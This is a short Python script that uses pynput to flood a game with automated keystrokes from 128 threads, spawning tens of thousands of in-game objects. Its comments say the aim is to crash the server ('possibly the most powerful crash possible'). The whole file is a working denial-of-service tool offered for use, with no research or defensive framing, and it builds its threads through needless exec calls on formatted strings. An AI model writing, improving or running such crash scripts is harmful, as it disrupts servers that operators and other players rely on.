import random
import time
import threading
from pynput import keyboard
from pynput.keyboard import Controller as KeyboardController, Key
from pynput.mouse import Controller as MouseController, Button
import tkinter as tk

controller = KeyboardController()

def ballcrashsegment():
    controller.press("`")
    for _ in range(20):
        for _ in range(20):
            # 390.625 ==> 391 balls (plus 9 for redundancy) ==> 400 balls
            controller.tap("c")
            controller.tap("h")        
    controller.release("`")

threads = []
start = time.time()
for i in range(128):
    # 128 threads x 400 balls = 51,200 balls
    #    (5,000 balls x 10 ==> 2,500mspt x 10 ==> 25,000mspt?)
    #    server would probably crash before measurement
    #
    # possible side effects:
    #   maybe socket time out
    #   possibly the most powerful crash possible
    
    exec(f"thread{i} = threading.Thread(target = ballcrashsegment)")
    exec(f"thread{i}.daemon = True")
    exec(f"threads.append(thread{i})")
    exec(f"thread{i}.start()")
print(f"Time taken: {round((time.time()-start)*1000, 3)}ms")